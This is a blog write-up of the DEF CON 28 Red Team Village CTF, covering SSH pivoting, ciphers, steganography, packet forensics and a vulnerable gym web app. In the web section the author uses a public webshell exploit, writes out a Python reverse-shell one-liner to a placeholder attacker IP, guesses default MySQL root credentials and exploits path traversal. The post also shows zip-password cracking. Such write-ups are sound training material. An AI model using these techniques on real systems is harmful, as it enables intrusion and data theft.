---
layout: post
title: Defcon28 Red Team Village CTF 2020 Write-up
date: 2020-08-09 12:00:00
categories: posts
comments: true
en: true
description:
keywords: "CTF, Defcon, Defcon28, writeups, write-ups, challenges, Red Team"
---

## Thoughts

I want to start this post out by saying a big thank you to all the organizers and volunteers of Defcon 28. We are all facing a difficult time at the moment in one way or another. Everyone really stepped up to make this event as great as it could be through the constraints of being exclusively virtual. Though I missed not being physically on-site to drink myself into a stupor amongst peers and friends, in exchange I found this year to be particularly productive. I participated in the Red Team village's CTF as well as the IOT village's CTF. I also took Georgia Weidman's "Hands-On Exploit Development" training. Georgia has a solid understanding of the material and communicates not just the concepts but the details well. Although this course was mostly review, I walked away with a more solid foundation on GNU's Debugger, troubleshooting code, and exploitation.  Big shoutout to the crew [@dc562](https://twitter.com/defcon562) you guys brought it this year and I couldn't be more proud. Please enjoy the write-ups from the challenges I completed in the Red Team village's CTF and feel free to contact me should you have any questions.

![scores](https://i.imgur.com/m7NloUl.png)



## Introduction {#intro}

| Challenge Name | Category | Solves | Points |
|:--------------:|:--------:|:------:|:------:|
|[1 Bastion](#1-bastion) | Tunneler | 360 | 25 |
|[2 Browsing Websites](#2-browsing-websites) | Tunneler | 276 | 50 |
|[3 SSH in tunnels](#3-ssh-in-tunnels) | Tunneler | 267 | 50 |
|[7 Another Pivot](#7-another-pivot) | Tunneler | 169 | 75 |
|[1 What failed](#1-what-failed) | Logs | 437 | 25 |
|[2 Who failed](#2-who-failed) | Logs | 388 | 25 |
|[3 We failed](#3-we-failed) | Logs | 401 | 25 |
|[4 Whom failed](#4-whom-failed) | Logs | 401 | 25 |
|[All about that base](#all-about-that-base) | Crypto, Ciphers, and Encodings | 504 | 10 |
|[All about that base remix](#all-about-that-base-remix) | Crypto, Ciphers, and Encodings | 360 | 10 |
|[n Eggs](#n-eggs) | Crypto, Ciphers, and Encodings | 423 | 10 |
|[et tu brute](#et-tu-brute) | Crypto, Ciphers, and Encodings | 376 | 10 |
|[AFSC 29331](#AFSC-29331) | Crypto, Ciphers, and Encodings | 313 | 10 |
|[Don't touch the third rail](#dont-touch-the-third-rail) | Crypto, Ciphers, and Encodings | 188 | 10 |
|[Why are they even in that order in the fist place?](#why-are-they-even-in-that-order-in-the-fist-place) | Crypto, Ciphers, and Encodings | 222 | 10 |
|[1 - Pop a shell on that](#1-pop-a-shell-on-that) | Workout at Home Gym | 145 | 200 |
|[2 - Let's enumerate the host a bit 1](#lets-enumerate-the-host-a-bit-1) | Workout at Home Gym | 131 | 25 |
|[3 - Let's enumerate the host a bit 2](#lets-enumerate-the-host-a-bit-2) | Workout at Home Gym | 125 | 50 |
|[4 - Let's have some SQL fun 1](#lets-have-some-sql-fun-1) | Workout at Home Gym | 112 | 300 |
|[5 - Let's have some SQL fun 2](#lets-have-some-sql-fun-2) | Workout at Home Gym | 100 | 75 |
|[6 - Let's have some SQL fun 3](#lets-have-some-sql-fun-3) | Workout at Home Gym | 95 | 75 |
|[7 - Let's have some SQL fun 4](#lets-have-some-sql-fun-4) | Workout at Home Gym | 108 | 75 |
|[1 Lookin' for dem Tiger Tunes](#lookin-for-dem-tiger-tunes) | Tiger Tunes | 127 | 50 |
|[2 Tigers Never Let You Down](#tigers-never-let-you-down) | Tiger Tunes | 52 | 150 |
|[4 Look Closer](#look-closer) | Tiger Tunes | 66 | 150 |
|[Can you hear me now?](#can-you-hear-me-now) | Forensics | 127 | 10 |
|[Just a nice picture](#just-a-nice-picture) | Forensics | 127 | 25 |
|[Strings](#strings) | Pwn | 155 | 75 |
|[Tom Nook - 1A - Internet Traffic](#tom-nook-1a-internet-traffic) | Forensics | 259 | 30 |
|[Tom Nook - 1B - Internet Traffic](#tom-nook-1b-internet-traffic) | Forensics | 318 | 10 |
|[Tom Nook - 1C - Internet Traffic](#tom-nook-1c-internet-traffic) | Forensics | 318 | 10 |
|[Tom Nook - 1D - Internet Traffic](#tom-nook-1d-internet-traffic) | Forensics | 279 | 25 |
|[Tom Nook - 1E - Internet Traffic](#tom-nook-1e-internet-traffic) | Forensics | 194 | 30 |
|[Tom Nook - 1F - Internet Traffic](#tom-nook-1f-internet-traffic) | Forensics | 192 | 20 |




----------------

## 1 Bastion
#### Category : Tunneler | Solves: 360 | Points: 25

----------------
![1 Bastion](https://i.imgur.com/Y4Gq7e9.png)



We are given the username password and port to connect to a bastion host via SSH.

In doing so we are presented with our first flag:

![tunneler-flag](https://i.imgur.com/5OOBj8d.png)

{:refdef: .flag}
Flag: `ts{SSHtoANonStandardPort}`
{:refdef}

Furthermore, we are given information to connect to "the pivot host":

Address: 10.218.176.199, user: whistler, password: cocktailparty

Simple enough.

----------------

[--- Back to Top ---](#intro)

----------------

## 2 Browsing Websites

#### Category: Tunneler | Solves: 276 | Points: 50

![2 Browsing Websites](https://i.imgur.com/q44nE6Y.png)



We are given "Browse to http://10.174.12.14"

This is an internal IP, we will need to setup a proxy in order to browse internally to this host.

We will accomplish this with proxychains and ssh with the following commands,

First, we will setup a dynamic port forward over port 1080 on our local host to the bastion server via ssh on port 2222.

`ssh -D 1080 tunneler@164.90.147.46 -p 2222`

Next, we configure our proxychains config file (found in /etc/proxychains.conf) to use this port on our localhost:

`echo "socks4  127.0.0.1 1080" >> /etc/proxychains.conf`

And lastly we use the following command to transfer data from the internal IP (rather than browsing to it):

`proxychains curl http://10.174.12.14`

We are given the following output:

![proxychains](https://i.imgur.com/YmOGSok.png)

{:refdef: .flag}
Flag: `ts{TheFirstTunnelIsTheEasiest}`
{:refdef}

{:refdef: style="text-align: center;"} [--- Back to Top ---](#intro) {: refdef}

----------------

## 3 SSH in tunnels

#### Category: Tunneler | Solves: 267 | Points: 50

![ssh-in-tunnels](https://i.imgur.com/ta3vY8c.png)



Now that we have our pivot setup we should be able to SSH into another host using proxychains:

`proxychains ssh whistler@10.218.176.199`

We successfully connect to this new host and receive the next flag!

![whistler-pivot](https://i.imgur.com/kRDNYEv.png)

{:refdef: .flag}
Flag: `ts{IThoughtWeLostYouOnTheWay}`
{:refdef}

----------------

[--- Back to Top ---](#intro)

----------------

## 7 Another Pivot

#### Category: Tunneler | Solves: 170 | Points: 75

![another-pivot](https://i.imgur.com/7Cuzgh9.png)



We are now tasked with connecting to an additional pivot.

There are two ways to go about this, I will cover both.

If we simply needed to connect to another host from our initial pivot and not establish another anchor point (second pivot) we could do this with a built in ssh command  (-J) that allows jumping from one SSH server to the next, some servers do not allow this, but in this case we can:

`proxychains ssh -J whistler@10.218.176.199 crease@10.112.3.12`

![ssh-j](https://i.imgur.com/fjSm8Zx.png)



The other way to accomplish this and pivot further into a network would be to create another dynamic port forward onto the first pivot machine, thus allowing us to connect over proxychains to this host rather than jumping from the first pivot machine from the initial bastion host we established a dynamic port forward on.

We need to specify a new port to dynamic forward through our localhost:

`proxychains ssh -D 1081 whistler@10.218.176.199`

![new-pivot](https://i.imgur.com/2NGTkxF.png)

Now we simply update our proxychains.conf file to use the new dynamic port `1081`:

![proxychainsconf](https://i.imgur.com/TjlMExi.png)

Lastly, let's use this new configuration to connect to the second pivot server and get our flag!:

`proxychains ssh crease@10.112.3.12`

![new-pivot](https://i.imgur.com/fSHsfo6.png)

{:refdef: .flag}
Flag: `ts{TunnelsInTunnelsInTunnels}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 1 - What failed

#### Category: Logs | Solves: 437 | Points: 25 

![What-failed](https://i.imgur.com/v558wuc.png)



I simply viewed the log file from Google Drive.

A quick check review of the log shows fail2ban is configured to ban users over ssh.

![readlogs](https://i.imgur.com/yQmVZ0k.png)

{:refdef: .flag}
Flag: `ssh`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 2 - Who failed

#### Category: Logs | Solves: 389 | Points: 25

![who-failed](https://i.imgur.com/BQHqlnY.png)



For these set of challenges, the same log file is used.

After careful review we locate each unique IP address that has been banned:

92.252.94.69
116.31.116.47
47.202.16.90
12.70.197.135
91.224.160.108
91.224.160.106
108.58.9.206
195.223.55.28

{:refdef: .flag}
Flag: `8`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 3 - We failed

#### Category: Logs | Solves: 401 | Points: 25



![we-failed](https://i.imgur.com/1Y23zKF.png)



The specific error we care about for this log entry is as follows:

![critical-error](https://i.imgur.com/BOExWpJ.png)

A simple CTRL+F find all search on this log file on "CRITICAL Unable to restore environment" gives us the flag: 48

{:refdef: .flag}
Flag: `48`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 4 - Whom failed

#### Category: Logs | Solves: 402 | Points: 25

![whom-failed](https://i.imgur.com/tFtwdiu.png)



We are searching for specific instances where the IP address is getting banned rather than reports of IPs that have already been banned.

Another use for CTRL+F through our web browser searching for "Ban <ip-address>":

This provides us with the following matches on IP Address: `116.31.116.47`

![mostfreq](https://i.imgur.com/3r9qh1Y.png)

{:refdef: .flag}
Flag: `116.31.116.47`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## All about that base

#### Category: Crypto, Ciphers, and Encodings | Solves: 504 | Points: 10

![all-about-that-base](https://i.imgur.com/E8u3DaJ.png)



This is a simple base64 encoded string.

`echo "dHN7SXNUaGlzRW5jcnlwdGlvbn0=" | base64 -d`

![base64](https://i.imgur.com/Qwsw5ou.png)

{:refdef: .flag}
Flag: `ts{IsThisEncryption}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## All about that base remix

#### Category: Crypto, Ciphers, and Encodings | Solves: 360 | Points: 10

![all-about-that-base-remix](https://i.imgur.com/9RVY2VQ.png)



Another base64 encoded string?....

![base64maybe](https://i.imgur.com/0MgY3dv.png)

Nope. Let's try another base format.

![base32](https://i.imgur.com/N9QHqPm.png)

Base32 it is...yawn.

{:refdef: .flag}
Flag: `ts{ThisIstotallyEncryption!}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## n Eggs

#### Category: Crypto, Ciphers, and Encodings | Solves: 423 | Points: 10

![n-eggs](https://i.imgur.com/frIVRUK.png)



The title "n Eggs" gives us a hint this is a Bacon Cipher.

Output: "TSBACONISMYNAME"

{:refdef: .flag}
Flag: `TSBACONISMYNAME`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## et tu brute

#### Category: Crypto, Ciphers, and Encodings | Solved: 313 | Points: 10

![et-tu-brute](https://i.imgur.com/LmSEbxm.png)

Based on the format of this string, this looks like the flag but just rotated.

Could it be the best encryption of all time ROT-13?

"TSANOLDIEBUTAGOODIE"

They should've used ROT-26.

{:refdef: .flag}
Flag: `TSANOLDIEBUTAGOODIE`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## AFSC 29331

#### Category: Crypto, Ciphers, and Encodings | Solves: 313 | Points: 10

![afsc-29331](https://i.imgur.com/mUiGKjz.png)



Doing a quick Google Search on AFSC 29331 we learn this is an Air Force Specialty Code.

The string itself looks like morse code.

"DUTY BOPPERS"

{:refdef: .flag}
Flag: `DUTY BOPPERS`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Don't touch the third rail

#### Category: Crypto, Ciphers, and Encodings | Solves: 188 | Points: 10

![dont-touch-the-third-rail](https://i.imgur.com/wDyUt8S.png)



The title gives us a hint this is likely a Rail Fence (Zig-Zag) Cipher.

Specifically with a height of 3.

"ts{ZigyzagyCipherFTW}"

{:refdef: .flag}
Flag: `ts{ZigyzagyCipherFTW}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Why are they even in that order in the fist place?

#### Category: Crypto, Ciphers, and Encodings | Solves: 222 | Points: 10

![why-are-they-even](https://i.imgur.com/G7TUQhV.png)

This was actually my favorite cipher challenge.

As we can tell, the numbers above range from as low as 3 to as high as 20.

My gut told me this was simply a numerical representation of alphabetical characters.

Let's translate it and check:

![wombo-combo](https://i.imgur.com/3McqGUM.png)

{:refdef: .flag}
Flag: `TSLONGESTCOMBOEVERRECORDED`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 1 - Pop on a shell on that

#### Category: Workout at Home Gym | Solves: 145 | Points: 200

![pop-a-shell](https://i.imgur.com/28my31L.png)



We are presented with the following challenge, to get a shell on this web server.

Let's browse to it and start our enumeration.

![gym-management-system](https://i.imgur.com/ediy2A7.png)

As we can see we are presented with some "Gym Management System 1.0" webapp software.

There is a login URL but let's do a quick check for any known vulnerabilities for this software.

![gym-rce](https://i.imgur.com/7D78x3x.png)

Hey that looks promising, let's check out the source code.

https://www.exploit-db.com/exploits/48506

Looks like this python script will perform uploading a php webshell through an unauthenticated file upload vulnerability. Let's give it a go.

![webshell](https://i.imgur.com/jKsQt1t.png)

Sweet ascii art.

Now to find the flag on the root of the filesystem:

![flag](https://i.imgur.com/KfS3qgv.png)

That was an easy shell to pop, no kidding.

{:refdef: .flag}
Flag: `ts{ThatWasAnEasyShelltoPop}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

##  2 - Let's Enumerate this host a bit 1

#### Category: Workout at Home Gym | Solves: 131 | Points: 25

![lets-enumerate-1](https://i.imgur.com/ZDHDwyu.png)



Now that we have our webshell, let's get a full shell on this host to make enumeration on the filesystem easier.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacking-ip>",6669));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

On out attacking server we setup a netcat listener:

`nc -nvlp 6669`

Once we catch the reverse shell we'll want to spawn a TTY:

`python -c 'import pty; pty.spawn("/bin/sh")'`

Now that we have a nice working shell we can check for the IP address of the mysql server.

I went ahead and ran `ps aux | grep mysql` to look for a running instance of mysql:

![mysql](https://i.imgur.com/as3JoMo.png)

So, we know the IP address is `10.213.12.10`

{:refdef: .flag}
Flag: `10.213.12.10`
{:refdef}

\----------------
[--- Back to Top ---](#intro)

----------------

## 3 - Let's Enumerate this host a bit 2

#### Category: Workout at Home Gym | Solves: 125 | Points: 50

![lets-enumerate-2](https://i.imgur.com/Eirr7Yy.png)

Next, we need to locate the root password of the SQL server account.

Well, we know from running our previous `ps aux | grep mysql` command that the www-data user has an active session connecting to the "gym" database on the SQL server with the root account.

Let's try some default passwords: root:root doesn't work. root:toor works!

`mysql -h 10.213.12.10 -u root -p`

![mysql-root](https://i.imgur.com/KjdFMRI.png)

{:refdef: .flag}
Flag: `toor`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Let's have some SQL fun 1

#### Category: Workout at Home Gym | Solves: 112 | Points: 300

![lets-have-some-sql-fun-1](https://i.imgur.com/Bg2xg8z.png)



We already have a real shell hehe.

Let's see if we can locate the admin user.

First we will use the following command to use the "gym" database from MySQL:

`use gym;`

Next let's take a look at the tables.

`show tables;`

![tables](https://i.imgur.com/f5lwkp5.png)

Members is likely the table we care about for this challenge. Let's check the columns for the members table.

`select columns from members;`

![columns](https://i.imgur.com/ywGaGVu.png)

Ok, so let's select members from the "admin" column who's value is 1.

`select * from members where admin = 1;`

![admin](https://i.imgur.com/tbtSkKh.png)

James is our admin.

{:refdef: .flag}
Flag: `James`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 5-Let's have some SQL fun 2

#### Category: Workout at Home Gym | Solves: 100 | Points: 75

![lets-have-some-sql-fun-2](https://i.imgur.com/VjqB8px.png)



We need to enumerate the SQL tables further to find this information.

Previously, when we checked the columns we saw a "currentmembership" column for the members table.

Let's check for members whose "currentmembership" = 1, meaning they have a current membership.

`select * from members where currentmembership =1;`

This gives us 5016 rows or members for output.

![currentmembership](https://i.imgur.com/SaRgGlS.png)

{:refdef: .flag}
Flag: `5016`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 6 - Let's have some SQL fun 3

#### Category: Workout at Home Gym | Solves: 95 | Points: 75

![lets-have-some-sql-fun-3](https://i.imgur.com/mrPvv5M.png)

Now we need to find the most popular gym location.

We know there is a "gymlocation" column from the members table. We will use this to find the flag.

Let's take another look at the tables.

`show tables;`

![tables](https://i.imgur.com/dDSnRyU.png)

Locations should tell us the different locations we will want to enumerate members with. Let's check it out.

![locations-table](https://i.imgur.com/PBz2Enf.png)

Okay, so we have our locations and their respective id's, now we simply need to check the number of members for each location, we'll choose the location with the most rows or members from the results.

`select * from members where gymlocation = 0`

2018 rows for "Home Location"

2017 rows for "Chicago"

1971 rows for "Atlanta"

2068 rows for "Austin"

1926 rows for "Baltimore"

Austin is the most popular gym location.

{:refdef: .flag}
Flag: `Austin`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 7 - Let's have some SQL fun 4

#### Category: Workout at Home Gym | Solves: 108 | Points: 75

![lets-have-some-sql-fun-4](https://i.imgur.com/dnJPRTU.png)

Now for the last flag in this category we will need to locate first failed login attempt by year.

Let's take a look at the tables once more:

`show tables;`

![tables](https://i.imgur.com/dDSnRyU.png)

Login_attempts likely has the information we are looking for.

Let's check the columns for this table:

`show columns from login_attempts;`

![login_attempts-columns](https://i.imgur.com/dz7pjml.png)

Okay, so the third column is of most interest to us. Let's see the values for this column.

`select * from login_attempts;`

![login_attempts](https://i.imgur.com/cO6zhYz.png)

Okay so we have numbers ranging from 1402641415-1597006651 or higher.

These timestamps are epochs, we will need to convert these to a human readable time format.

![epoch-to-human](https://i.imgur.com/zWk8cli.png)

Great, so it looks like 15XXXXXXX is from year 2020, let's try showing only values of login_attempts from lower values, let's say 1400000000.

`select * from login_attempts where time <= 1400000000`

We see 603 rows in this set. 

Let's check lower than 1380000000

`select * from login_attempts where time <= 13800000000`

Empty set. It looks like the lowest value is at least 139XXXXXXX

This gives us the following year: `2014`

{:refdef: .flag}
Flag: `2014`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## 1 Lookin' for dem Tiger Tunes

#### Category: Tiger Tunes | Solves: 127 | Points: 50

![lookin-for-dem-tiger-tunes](https://i.imgur.com/ceYKI1Q.png)



We are presented with the following url:

`http://164.90.157.234:8000/`

Browsing here we find:

![tiger-tunes](https://i.imgur.com/GxfyY6y.png)

Enumerating the  website we find the following in the robots.txt file:

![robots.txt](https://i.imgur.com/LpgUZlF.png)

Unfortunately, it's the challenge is not as simple as browsing to /etc/flag.txt through the URI.

Let's see if we can find this file with a vulnerability.

At the top we see a search bar, maybe there is a local file inclusion vulnerability through the search function.

![search-lfi](https://i.imgur.com/BMO6loa.png)

Sure enough, by searching for ../../etc/flag.txt we are returned with the output of /etc/flag.txt

{:refdef: .flag}
Flag: `TS{SheDidItDotDotDotty}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Tigers Never Let You Down

#### Category: Tiger Tunes | Solves: 52 | Points: 150

![tigers-never-let-you-down](https://i.imgur.com/rQPE6WS.png)

I'll be honest, this one took me a little while to figure out. But it finally clicked, let's walk through the process.

We know from the webapp that there is a "Joe's Tracks" directory.

Browsing here "http://164.90.157.234:8000/joe.php"

We see images of popular albums, including the ever popular "Joe Exotic's - Tiger King" album.

![joes-tracks](https://i.imgur.com/TZm9bOD.png)

My initial thought was there is either another web vulnerability chained from the location of this album image, or steganography on the album art itself.

Browsing to "Joe Exotic's - Tiger King" album art we see some password lock layer on top of the image. This must be steganography right? Let's check the directory the .jpg is in.

"http://164.90.157.234:8000/album/"

![tigerkingalt-hmm](https://i.imgur.com/DUWDmxg.png)

Hmm, so there is the original tigerking.jpg album and a tigerking_alt.jpg image.

Let's check for hidden data in the original image.

`steghide extract -sf tigerking.jpg`

![steghide1](https://i.imgur.com/0onvjc8.png)

Okay, so we located a troll.txt file from the image that contains a base64 string that decodes to a youtube link. We are about to get rick rolled. Yep.

At this point I checked the tigerking_alt.jpg image for steganography before circling back to this challenge.

However, the point that clicked was the connection between the rick roll and the title of the challenge "Tigers Never Let You Down".

Checking the entire list of jpg files in the album directory, we locate a "rickastley.jpg" image.

"http://164.90.157.234:8000/album/rickastley.jpg"

![rickastley](https://i.imgur.com/jydDaBf.png)

Let's download this file and check it with steghide.

`steghide extract -sf rickastley.jpg`

![rickstegly](https://i.imgur.com/RzDzkuU.png)

We found our flag!

{:refdef: .flag}
Flag: `TS{NeverGonnaLetYouFindMyExHusbandsBody}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Look Closer

#### Category: Tiger Tunes | Solves: 66 | Points: 150

![look-closer](https://i.imgur.com/xzLCBjH.png)

So, from the last challenge we had located two separate tigerking.jpg files.

We know there is no file hidden within the image itself from the last challenge.

Let's look at the tigerking_alt.jpg file from within Gimp and see if the flag is hidden within the image itself.

By adjusting the brightness on the image, we locate the flag on the image itself.

Easy enough.

![tigerkingaltflag](https://i.imgur.com/CNXrVlj.png)

{:refdef: .flag}
Flag: `TS{SupaHotFireeeeee}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Can you hear me now?

#### Category: Forensics | Solves: 127 | Points: 10

![can-you-hear-me-now](https://i.imgur.com/QAjExF1.png)



We are given a .wav file from the google drive link above.

Let's download the file and give it a listen.

Opening the file in Audacity we don't hear anything audibly pleasing.

Let's open the spectrogram.

![spectoez](https://i.imgur.com/PROp2jU.png)

Easy enough.

{:refdef: .flag}
Flag: `flag{s0nicw@v!}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Just a nice picture

#### Category: Forensics | Solves: 127 | Points: 25

![just-a-nice-picture](https://i.imgur.com/2EBQoHW.png)



The link provides a ctf.jpg image.

Let's download this image and check for steganography.

Initially, I tried adjusting the images brightness, contrast, and color levels (red, blue, and green), all to no avail.

Steghide didn't yield any hidden content either, time to try some other stuff.

Running strings on the file shows some interesting content:

`strings ctf.jpg`

![flaginside](https://i.imgur.com/6tRPV6G.png)

Let's use binwalk to check the contents of this file.

`binwalk ctf.jpg`

![binwalk](https://i.imgur.com/Q12yDxN.png)

Running binwalk on this file, we see a zip archive at 0x290791 offset that contains a flag.txt file.

Let's use "dd" to extract the contents.

![dd](https://i.imgur.com/cIk4oUF.png)

We are unable to zip the file as it is password protected.

Let's use fcrackzip to attempt to bruteforce the password with rockyou.txt wordlist.

`fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt flag.zip`

![fcrackzip](https://i.imgur.com/hoQloIG.png)

Finally, let's unzip the archive and display the flag.

![unzip-flag](https://i.imgur.com/8dgHdIf.png)

{:refdef: .flag}
Flag: `flag{f93kfaskdif92}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Strings

#### Category: Pwn | Solves: 155 | Points: 75

![strings](https://i.imgur.com/i88iZAB.png)



We download the "strings.c" file and compile it using GCC.

`gcc -o strings strings.c`

Checking our newly compiled "strings" file with strings we see the flag in the output but it has been mangled.

Let's try viewing this compiled binary in a memory hex viewer such as "xxd".

`xxd strings`

![xxd-strings](https://i.imgur.com/FyymuAt.png)

Easy enough.

{:refdef: .flag}
Flag: `ts{DidYouUseStringsorMaths}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Tom Nook - 1A - Internet Traffic

#### Category: Forensics | Solves: 259 | Points: 30

![tom-nook-1a](https://i.imgur.com/oYxfsph.png)

We are given 7zipped archive containing a packet capture file.

`7z x TomNookInternetTraffic.7z`

Now, let's open this pcap file in Wireshark 

![wireshark-pcap](https://i.imgur.com/RAbhaxZ.png)

{:refdef: .flag}
Flag: `TS{TomNookUsesTheInternet}`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Tom Nook - 1B - Internet Traffic

#### Category: Forensics | Solves: 321 | Points: 10

![tom-nook-1b](https://i.imgur.com/ckSIIBq.png)

Analyzing the pcap file from the screenshot in the first challenge we find the source IP:

Source: 192.168.1.47

{:refdef: .flag}
Flag: `192.168.1.47`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Tom Nook - 1C - Internet Traffic

#### Category: Forensics | Solves: 321 | Points: 10

![tom-nook-1c](https://i.imgur.com/zkq2ml3.png)

Now we simply need to locate the destination rather than the source with the pcap file.

Destination: 161.35.110.243

{:refdef: .flag}
Flag: `161.35.110.243`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Tom Nook - 1D - Internet Traffic

#### Category: Forensics | Solves: 282 | Points: 25

![tom-nook-1d](https://i.imgur.com/EKxC9uA.png)

Further analysis of the packet captures and we find the following filename:

![filename](https://i.imgur.com/PaQG8zD.png)

{:refdef: .flag}
Flag: `SecretACBankStatement.zip`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Tom Nook - 1E - Internet Traffic

#### Category: Forensics | Solves: 282 | Points: 25

![tom-nook-1e](https://i.imgur.com/c5jNhm4.png)

We locate the "SecretACBankStatement.zip" file and use the Export Packet Bytes... tool to extract the zip file.

![zip-extract](https://i.imgur.com/kaB2Anw.png)

Now, we simply need to crack the password for this zip file.

Let's use fcrackzip.

`fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt raw`

![fcrackzip](https://i.imgur.com/X3OHPYg.png)

{:refdef: .flag}
Flag: `monkey123`
{:refdef}

----------------
[--- Back to Top ---](#intro)

----------------

## Tom Nook - 1F - Internet Traffic

#### Category: Forensics | Solves: 194 | Points: 20

![tom-nook-1f](https://i.imgur.com/njjBgOD.png)

Lastly, we need to simply unzip the contents and find the flag in the PDF.

![unzip](https://i.imgur.com/syXLl22.png)

Opening this "BankStatement.pdf" file we find the last flag.

![pdfflag](https://i.imgur.com/wfZGj75.png)

{:refdef: .flag}
Flag: `TS{TomNookDrivesTheBoat}`
{:refdef}

----------------
[--- Back to Top ---](#intro)